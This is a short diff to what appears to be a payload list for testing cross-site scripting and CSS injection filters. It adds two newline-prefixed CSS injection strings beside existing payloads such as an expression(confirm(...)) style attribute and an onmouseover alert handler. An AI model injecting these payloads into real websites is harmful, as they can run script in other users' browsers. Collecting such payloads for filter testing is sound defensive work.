@@ -20,4 +20,6 @@ behaviour:url\0028javascript:confirm\0028[0][0]\0029\0029
 <XSS STYLE="xss:expression(confirm(document.location))">
 <style>*{display:table; border:10px solid red;}</style>
 <title onmouseover="alert(1)">hover me</title>
+%0A{}*{color:red;}
+%0A%0D{}*{color:red;}
 /* RFI END */
